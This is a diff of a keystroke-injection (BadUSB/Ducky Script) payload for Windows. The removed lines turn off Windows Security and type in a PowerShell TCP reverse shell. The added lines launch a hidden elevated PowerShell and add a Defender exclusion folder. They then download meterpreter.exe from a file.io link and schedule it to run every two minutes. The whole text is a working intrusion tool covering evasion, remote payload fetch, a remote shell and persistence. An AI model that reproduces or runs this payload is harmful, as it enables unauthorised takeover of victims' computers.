@@ -1,57 +1,24 @@
+DELAY 5000
+REM Enter PowerShell with admin privileges and type in the reverse shell command
+GUI R
 DELAY 500
-
-REM Disable Windows Security
-GUI
-DELAY 500
-STRING virus and threat
-DELAY 500
+STRING powershell -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden' -Verb RunAs"
 ENTER
-DELAY 500
-TAB
-DELAY 300
-TAB
-DELAY 300
-TAB
-DELAY 300
-TAB
-DELAY 300
-TAB
-DELAY 300
-ENTER
-DELAY 500
-SPACE
-DELAY 400
+DELAY 1000
 LEFTARROW
 DELAY 500
 ENTER
-DELAY 300
-ALT F4
-DELAY 300
-
-REM Enter PowerShell and type in the reverse shell command
-GUI R
-DELAY 500
-STRING powershell -WindowStyle Hidden
+DELAY 1000
+REM download script
+STRING Add-MpPreference -ExclusionPath "C:\Users\Public"
 DELAY 500
 ENTER
-DELAY 500
-
-REM Create the TCP client
-STRING $client = New-Object System.Net.Sockets.TCPClient('IP', PORT)
-DELAY 500
-ENTER
-
-REM Get the stream
-STRING $stream = $client.GetStream()
-DELAY 500
-ENTER
-
-REM Initialize the byte array
-STRING [byte[]]$bytes = 0..65535|%{0}
+DELAY 200
+STRING Invoke-WebRequest -Uri https://file.io/noTLXo6PXXKX -OutFile C:\Users\Public\meterpreter.exe
 DELAY 500
 ENTER
 
 REM Start the read loop
-STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();};$client.Close()
+STRING schtasks /create /tn "MicroSoft meterpreter" /tr "C:\Users\Public\meterpreter.exe" /sc minute /mo 2  /f
 DELAY 500
 ENTER
